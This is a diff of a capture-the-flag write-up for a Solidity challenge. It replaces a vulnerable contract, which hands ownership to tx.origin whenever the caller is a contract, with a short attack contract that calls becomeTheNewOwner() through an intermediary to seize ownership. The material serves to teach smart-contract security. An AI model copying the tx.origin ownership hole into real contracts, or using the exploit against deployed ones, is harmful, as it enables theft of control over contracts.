@@ -4,24 +4,24 @@
 
 To validate this challenge, the user needs to become the owner of the contract.
 
-To do that, he needs to call the `becomeTheOwner()` function with a contract.
+To do that, he needs to call the `becomeTheNewOwner()` function with a contract.
 
 ```sol
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.6.0;
 
-contract BecomeTheNewOwner {
-    address public owner;
+import "../../levels/easyChalls/BecomeTheNewOwner.sol";
 
-    constructor() public {
-        owner = msg.sender;
+contract attackBecomeTheNewOwner {
+    BecomeTheNewOwner originalContract;
+
+    constructor(address _originalContract) public {
+        originalContract = BecomeTheNewOwner(_originalContract);
     }
 
-    function becomeTheNewOwner() public {
-        if (tx.origin != msg.sender) {
-            owner = tx.origin;
-        }
+    function exploit() public {
+        originalContract.becomeTheNewOwner();
     }
 }
 ```
